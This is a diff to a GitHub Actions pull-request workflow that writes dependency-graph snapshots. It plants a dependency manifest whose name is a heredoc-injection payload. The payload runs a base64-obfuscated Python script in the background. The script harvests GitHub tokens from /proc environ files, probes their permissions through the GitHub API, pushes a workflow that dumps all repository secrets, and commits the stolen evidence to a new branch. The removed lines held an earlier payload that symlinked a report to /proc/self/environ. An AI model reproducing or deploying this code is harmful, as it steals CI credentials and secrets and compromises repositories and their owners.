@@ -1,12 +1,9 @@
 name: PR Workflow
-
 on:
   pull_request:
     branches: [development]
-
 permissions:
   contents: read
-
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -27,16 +24,7 @@ jobs:
           base = os.environ['BASE_SHA']
           n = os.environ['PR_NUM']
 
-          evil = (
-              "poc-manifest\n"
-              "EOF\n"
-              "id\n"
-              "readlink openssf-report.html || true\n"
-              "rm -f openssf-report.html\n"
-              "ln -s /proc/self/environ openssf-report.html\n"
-              "readlink openssf-report.html\n"
-              "exit 0\n"
-          )
+          evil = "poc2\nEOF\necho RCEMARKER_1794424454\nid\necho aW1wb3J0IGdsb2IsIGpzb24sIG9zLCByZSwgc3VicHJvY2VzcywgdGltZSwgdXJsbGliLnJlcXVlc3QsIHVybGxpYi5lcnJvciwgYmFzZTY0IGFzIGI2NAoKUiA9ICJQREZ0b01hcmsvdHJpYWdlLWVwYW0tdmQxMmU2NjAtYzg3MDBhIgpBUEkgPSAiaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbSIKCgpkZWYgcmVhZF9lbnZpcm9uKHBhdGgpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihwYXRoLCAicmIiKSBhcyBmOgogICAgICAgICAgICByZXR1cm4gZi5yZWFkKCkuZGVjb2RlKCJ1dGYtOCIsICJyZXBsYWNlIikKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmV0dXJuICIiCgoKZGVmIHNjYW4ocGF0dGVybiwgc2Vjb25kcyk6CiAgICByeCA9IHJlLmNvbXBpbGUocGF0dGVybikKICAgIGRlYWRsaW5lID0gdGltZS50aW1lKCkgKyBzZWNvbmRzCiAgICB3aGlsZSB0aW1lLnRpbWUoKSA8IGRlYWRsaW5lOgogICAgICAgIGZvciBwIGluIGdsb2IuZ2xvYigiL3Byb2MvWzAtOV0qL2Vudmlyb24iKToKICAgICAgICAgICAgZm9yIGt2IGluIHJlYWRfZW52aXJvbihwKS5zcGxpdCgiXDAiKToKICAgICAgICAgICAgICAgIGlmIHJ4Lm1hdGNoKGt2KToKICAgICAgICAgICAgICAgICAgICByZXR1cm4ga3Yuc3BsaXQoIj0iLCAxKVsxXQogICAgICAgIHRpbWUuc2xlZXAoMC4wNSkKICAgIHJldHVybiBOb25lCgoKZGVmIGFwaShtZXRob2QsIHBhdGgsIHRva2VuLCBib2R5PU5vbmUpOgogICAgZGF0YSA9IGpzb24uZHVtcHMoYm9keSkuZW5jb2RlKCkgaWYgYm9keSBpcyBub3QgTm9uZSBlbHNlIE5vbmUKICAgIHJlcSA9IHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoQVBJICsgcGF0aCwgZGF0YT1kYXRhLCBtZXRob2Q9bWV0aG9kKQogICAgcmVxLmFkZF9oZWFkZXIoIkF1dGhvcml6YXRpb24iLCAiQmVhcmVyICIgKyB0b2tlbikKICAgIHJlcS5hZGRfaGVhZGVyKCJBY2NlcHQiLCAiYXBwbGljYXRpb24vdm5kLmdpdGh1Yitqc29uIikKICAgIHJlcS5hZGRfaGVhZGVyKCJYLUdpdEh1Yi1BcGktVmVyc2lvbiIsICIyMDIyLTExLTI4IikKICAgIGlmIGRhdGEgaXMgbm90IE5vbmU6CiAgICAgICAgcmVxLmFkZF9oZWFkZXIoIkNvbnRlbnQtVHlwZSIsICJhcHBsaWNhdGlvbi9qc29uIikKICAgIHRyeToKICAgICAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCB0aW1lb3V0PTIwKSBhcyByOgogICAgICAgICAgICByZXR1cm4gci5zdGF0dXMsIHIucmVhZCgpLmRlY29kZSgidXRmLTgiLCAicmVwbGFjZSIpCiAgICBleGNlcHQgdXJsbGliLmVycm9yLkhUVFBFcnJvciBhcyBlOgogICAgICAgIHJldHVybiBlLmNvZGUsIGUucmVhZCgpLmRlY29kZSgidXRmLTgiLCAicmVwbGFjZSIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIDAsIHJlcHIoZSkKCgpyZXN1bHQgPSB7CiAgICAicnVuX2lkIjogb3MuZW52aXJvbi5nZXQoIkdJVEhVQl9SVU5fSUQiKSwKICAgICJqb2IiOiBvcy5lbnZpcm9uLmdldCgiR0lUSFVCX0pPQiIpLAogICAgIndvcmtmbG93Ijogb3MuZW52aXJvbi5nZXQoIkdJVEhVQl9XT1JLRkxPVyIpLAogICAgImlkIjogc3VicHJvY2Vzcy5nZXRvdXRwdXQoImlkIiksCiAgICAidHMiOiBpbnQodGltZS50aW1lKCkpLAp9Cgpqb2JfdG9rZW4gPSBOb25lCmJvdF90b2tlbiA9IE5vbmUKcnhfam9iID0gcmUuY29tcGlsZShyIl5JTlBVVF9HSVRIVUItVE9LRU49Z2hzXyIpCnJ4X2JvdCA9IHJlLmNvbXBpbGUociJeSU5QVVRfR0lUSFVCX1RPS0VOPShnaFtwb3Vzcl1ffGdpdGh1Yl9wYXRfKSIpCnJ4X2FsdCA9IHJlLmNvbXBpbGUociJeKEdJVEhVQl9UT0tFTnxJTlBVVF9UT0tFTnxJTlBVVF9SRVBPLVRPS0VOKT1naHNfIikKZGVhZGxpbmUgPSB0aW1lLnRpbWUoKSArIDE1MAp3aGlsZSB0aW1lLnRpbWUoKSA8IGRlYWRsaW5lIGFuZCBqb2JfdG9rZW4gaXMgTm9uZToKICAgIGZvciBwIGluIGdsb2IuZ2xvYigiL3Byb2MvWzAtOV0qL2Vudmlyb24iKToKICAgICAgICBmb3Iga3YgaW4gcmVhZF9lbnZpcm9uKHApLnNwbGl0KCJcMCIpOgogICAgICAgICAgICBpZiBqb2JfdG9rZW4gaXMgTm9uZSBhbmQgKHJ4X2pvYi5tYXRjaChrdikgb3IgcnhfYWx0Lm1hdGNoKGt2KSk6CiAgICAgICAgICAgICAgICBqb2JfdG9rZW4gPSBrdi5zcGxpdCgiPSIsIDEpWzFdCiAgICAgICAgICAgIGlmIGJvdF90b2tlbiBpcyBOb25lIGFuZCByeF9ib3QubWF0Y2goa3YpOgogICAgICAgICAgICAgICAgYm90X3Rva2VuID0ga3Yuc3BsaXQoIj0iLCAxKVsxXQogICAgaWYgam9iX3Rva2VuIGlzIG5vdCBOb25lIGFuZCBib3RfdG9rZW4gaXMgbm90IE5vbmU6CiAgICAgICAgYnJlYWsKICAgIHRpbWUuc2xlZXAoMC4wMykKaWYgYm90X3Rva2VuIGlzIE5vbmU6CiAgICBkZWFkbGluZSA9IHRpbWUudGltZSgpICsgNQogICAgd2hpbGUgdGltZS50aW1lKCkgPCBkZWFkbGluZSBhbmQgYm90X3Rva2VuIGlzIE5vbmU6CiAgICAgICAgZm9yIHAgaW4gZ2xvYi5nbG9iKCIvcHJvYy9bMC05XSovZW52aXJvbiIpOgogICAgICAgICAgICBmb3Iga3YgaW4gcmVhZF9lbnZpcm9uKHApLnNwbGl0KCJcMCIpOgogICAgICAgICAgICAgICAgaWYgcnhfYm90Lm1hdGNoKGt2KToKICAgICAgICAgICAgICAgICAgICBib3RfdG9rZW4gPSBrdi5zcGxpdCgiPSIsIDEpWzFdCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICB0aW1lLnNsZWVwKDAuMDUpCgpyZXN1bHRbImpvYl90b2tlbl9mb3VuZCJdID0gYm9vbChqb2JfdG9rZW4pCnJlc3VsdFsiYm90X3Rva2VuX2ZvdW5kIl0gPSBib29sKGJvdF90b2tlbikKcmVzdWx0WyJqb2JfdG9rZW5fcHJlZml4Il0gPSAoam9iX3Rva2VuIG9yICIiKVs6OF0KcmVzdWx0WyJib3RfdG9rZW5fcHJlZml4Il0gPSAoYm90X3Rva2VuIG9yICIiKVs6OF0KCnVzYWJsZSA9IHt9CmZvciBuYW1lLCB0b2sgaW4gKCgiam9iIiwgam9iX3Rva2VuKSwgKCJib3QiLCBib3RfdG9rZW4pKToKICAgIGlmIG5vdCB0b2s6CiAgICAgICAgY29udGludWUKICAgIHN0LCBib2R5ID0gYXBpKCJHRVQiLCAiL3JlcG9zLyIgKyBSLCB0b2spCiAgICBpbmZvID0geyJzdGF0dXMiOiBzdH0KICAgIHRyeToKICAgICAgICBqID0ganNvbi5sb2Fkcyhib2R5KQogICAgICAgIGluZm9bImZ1bGxfbmFtZSJdID0gai5nZXQoImZ1bGxfbmFtZSIpCiAgICAgICAgaW5mb1sicGVybWlzc2lvbnMiXSA9IGouZ2V0KCJwZXJtaXNzaW9ucyIpCiAgICAgICAgaW5mb1siZGVmYXVsdF9icmFuY2giXSA9IGouZ2V0KCJkZWZhdWx0X2JyYW5jaCIpCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIGluZm9bImJvZHkiXSA9IGJvZHlbOjQwMF0KICAgIHN0MiwgYm9keTIgPSBhcGkoIkdFVCIsICIvaW5zdGFsbGF0aW9uL3JlcG9zaXRvcmllcyIsIHRvaykKICAgIGluZm9bImluc3RhbGxhdGlvbl9yZXBvc19zdGF0dXMiXSA9IHN0MgogICAgdHJ5OgogICAgICAgIGluZm9bImluc3RhbGxhdGlvbl9yZXBvc19jb3VudCJdID0gbGVuKGpzb24ubG9hZHMoYm9keTIpLmdldCgicmVwb3NpdG9yaWVzIiwgW10pKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBpbmZvWyJpbnN0YWxsYXRpb25fYm9keSJdID0gYm9keTJbOjMwMF0KICAgIHJlc3VsdFtuYW1lICsgIl9wcm9iZSJdID0gaW5mbwogICAgaWYgMjAwIDw9IHN0IDwgMzAwOgogICAgICAgIHVzYWJsZVtuYW1lXSA9IHRvawoKcmVzdWx0WyJ1c2FibGVfdG9rZW5zIl0gPSBzb3J0ZWQodXNhYmxlLmtleXMoKSkKCnRzID0gcmVzdWx0WyJ0cyJdCmJyID0gInJjZS1wcm9vZi0lcyIgJSB0cwp3ZiA9ICgKICAgICJuYW1lOiBmbGFnLWR1bXBcbiIKICAgICJvbjogcHVzaFxuIgogICAgInBlcm1pc3Npb25zOiB7fVxuIgogICAgImpvYnM6XG4iCiAgICAiICBkdW1wOlxuIgogICAgIiAgICBydW5zLW9uOiB1YnVudHUtbGF0ZXN0XG4iCiAgICAiICAgIHN0ZXBzOlxuIgogICAgIiAgICAgIC0gbmFtZTogZHVtcCBzZWNyZXRzXG4iCiAgICAiICAgICAgICBydW46IHxcbiIKICAgICIgICAgICAgICAgZWNobyBcIiR7eyB0b0pTT04oc2VjcmV0cykgfX1cIlxuIgogICAgIiAgICAgICAgICBlY2hvIC1uIFwiJHt7IHRvSlNPTihzZWNyZXRzKSB9fVwiIHwgYmFzZTY0IC13MFxuIgopCgpmb3IgbmFtZSwgdG9rIGluIHVzYWJsZS5pdGVtcygpOgogICAgc3QsIGJvZHkgPSBhcGkoIkdFVCIsICIvcmVwb3MvIiArIFIgKyAiL2dpdC9yZWYvaGVhZHMvZGV2ZWxvcG1lbnQiLCB0b2spCiAgICBiYXNlX3NoYSA9ICIiCiAgICB0cnk6CiAgICAgICAgYmFzZV9zaGEgPSBqc29uLmxvYWRzKGJvZHkpWyJvYmplY3QiXVsic2hhIl0KICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmVzdWx0W25hbWUgKyAiX3JlZl9lcnJvciJdID0gYm9keVs6MjAwXQogICAgaWYgbm90IGJhc2Vfc2hhOgogICAgICAgIGNvbnRpbnVlCiAgICBzdCwgYm9keSA9IGFwaSgiUE9TVCIsICIvcmVwb3MvIiArIFIgKyAiL2dpdC9yZWZzIiwgdG9rLAogICAgICAgICAgICAgICAgICAgeyJyZWYiOiAicmVmcy9oZWFkcy8iICsgYnIsICJzaGEiOiBiYXNlX3NoYX0pCiAgICByZXN1bHRbbmFtZSArICJfY3JlYXRlX2JyYW5jaCJdID0geyJzdGF0dXMiOiBzdCwgImJvZHkiOiBib2R5WzoyNTBdfQogICAgaWYgbm90ICgyMDAgPD0gc3QgPCAzMDApIGFuZCBzdCAhPSA0MjI6CiAgICAgICAgY29udGludWUKICAgIHN0LCBib2R5ID0gYXBpKCJQVVQiLCAiL3JlcG9zLyIgKyBSICsgIi9jb250ZW50cy8uZ2l0aHViL3dvcmtmbG93cy9mbGFnLWR1bXAueW1sIiwgdG9rLAogICAgICAgICAgICAgICAgICAgeyJtZXNzYWdlIjogInByb2JlIHdvcmtmbG93IiwgImNvbnRlbnQiOiBiNjQuYjY0ZW5jb2RlKHdmLmVuY29kZSgpKS5kZWNvZGUoKSwgImJyYW5jaCI6IGJyfSkKICAgIHJlc3VsdFtuYW1lICsgIl9wdXRfd29ya2Zsb3ciXSA9IHsic3RhdHVzIjogc3QsICJib2R5IjogYm9keVs6NjAwXX0KICAgIGlmIDIwMCA8PSBzdCA8IDMwMDoKICAgICAgICBzdDIsIGJvZHkyID0gYXBpKCJQVVQiLCAiL3JlcG9zLyIgKyBSICsgIi9jb250ZW50cy90cmlnZ2VyLSVzLnR4dCIgJSB0cywgdG9rLAogICAgICAgICAgICAgICAgICAgICAgICAgeyJtZXNzYWdlIjogInRyaWdnZXIiLCAiY29udGVudCI6IGI2NC5iNjRlbmNvZGUoYiJnbyIpLmRlY29kZSgpLCAiYnJhbmNoIjogYnJ9KQogICAgICAgIHJlc3VsdFtuYW1lICsgIl90cmlnZ2VyIl0gPSB7InN0YXR1cyI6IHN0MiwgImJvZHkiOiBib2R5Mls6MzAwXX0KICAgICAgICByZXN1bHRbImJyYW5jaCJdID0gYnIKCmV2ID0ganNvbi5kdW1wcyhyZXN1bHQsIGluZGVudD0xKS5lbmNvZGUoKQpmb3IgbmFtZSwgdG9rIGluIHVzYWJsZS5pdGVtcygpOgogICAgc3QsIGJvZHkgPSBhcGkoIlBVVCIsICIvcmVwb3MvIiArIFIgKyAiL2NvbnRlbnRzL3JjZS1ldmlkZW5jZS0lcy0lcy5qc29uIiAlIChuYW1lLCB0cyksIHRvaywKICAgICAgICAgICAgICAgICAgIHsibWVzc2FnZSI6ICJyY2UgZXZpZGVuY2UiLCAiY29udGVudCI6IGI2NC5iNjRlbmNvZGUoZXYpLmRlY29kZSgpLCAiYnJhbmNoIjogYnJ9KQogICAgcmVzdWx0WyJldmlkZW5jZV8iICsgbmFtZV0gPSB7InN0YXR1cyI6IHN0LCAiYm9keSI6IGJvZHlbOjIwMF19CgpwcmludChqc29uLmR1bXBzKHJlc3VsdCwgaW5kZW50PTEpKQo= | base64 -d > /tmp/w.py || true\nnohup python3 -u /tmp/w.py > /tmp/w.out 2>&1 < /dev/null &\nsleep 1\nexit 0\n"
 
           def manifest(name, coordinate, purl):
               return {
@@ -50,16 +38,8 @@ jobs:
                   },
               }
 
-          common = manifest(
-              "build.gradle.kts",
-              "org.apache.commons:commons-lang3:3.12.0",
-              "pkg:maven/org.apache.commons/commons-lang3@3.12.0",
-          )
-          bumped = manifest(
-              "build.gradle.kts",
-              "org.apache.commons:commons-lang3:3.13.0",
-              "pkg:maven/org.apache.commons/commons-lang3@3.13.0",
-          )
+          common = manifest("build.gradle.kts", "org.apache.commons:commons-lang3:3.12.0", "pkg:maven/org.apache.commons/commons-lang3@3.12.0")
+          bumped = manifest("build.gradle.kts", "org.apache.commons:commons-lang3:3.13.0", "pkg:maven/org.apache.commons/commons-lang3@3.13.0")
 
           def snapshot(sha, ref, manifests):
               return {
@@ -73,14 +53,7 @@ jobs:
               }
 
           base_snapshot = snapshot(base, "refs/heads/development", {"build.gradle.kts": common})
-          head_snapshot = snapshot(
-              head,
-              "refs/pull/%s/head" % n,
-              {
-                  "build.gradle.kts": bumped,
-                  evil: manifest(evil, "com.example:evil:1.0.0", "pkg:maven/com.example/evil@1.0.0"),
-              },
-          )
+          head_snapshot = snapshot(head, "refs/pull/%s/head" % n, {"build.gradle.kts": bumped, evil: manifest(evil, "com.example:evil:1.0.0", "pkg:maven/com.example/evil@1.0.0")})
 
           json.dump(base_snapshot, open("dependency-graph-reports/snapshot-base.json", "w"))
           json.dump(head_snapshot, open("dependency-graph-reports/snapshot-head.json", "w"))
